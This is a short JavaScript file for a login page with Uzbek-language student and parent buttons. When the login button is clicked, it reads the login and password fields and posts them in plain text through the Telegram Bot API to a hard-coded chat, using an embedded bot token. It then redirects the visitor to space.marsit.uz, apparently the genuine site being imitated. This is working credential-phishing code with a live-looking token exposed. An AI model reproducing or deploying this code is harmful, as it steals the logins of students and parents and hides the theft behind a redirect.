// // 5530572466
let login_button = document.querySelector('.login-button');
let inputs = document.querySelectorAll('input');
let btn_oquvchi = document.querySelectorAll('.btn_oquvchi');
let bot_token = '7168480605:AAH3Q6Fjg3l2BK30_8uQHzIU72VWq5_pu0E';

login_button.addEventListener('click', () => {
    fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: 5530572466,
            text: `login:${inputs[0].value} \n password:${inputs[1].value}`
        })
    }).then(res => res.json()).then(data => {
        window.location.href = 'https://space.marsit.uz';
    });
});

// const btnOquvchi = document.querySelector('.btn_oquvchi');
// btnOquvchi.addEventListener('click', () => {
//     btnOquvchi.style.color = 'black';
// });

function loginAsStudent() {
    alert("O'quvchi bo'limiga kirish.");
    // Add your login logic here for students
}

function loginAsParent() {
    alert("Ota-ona bo'limiga kirish.");
    // Add your login logic here for parents
}
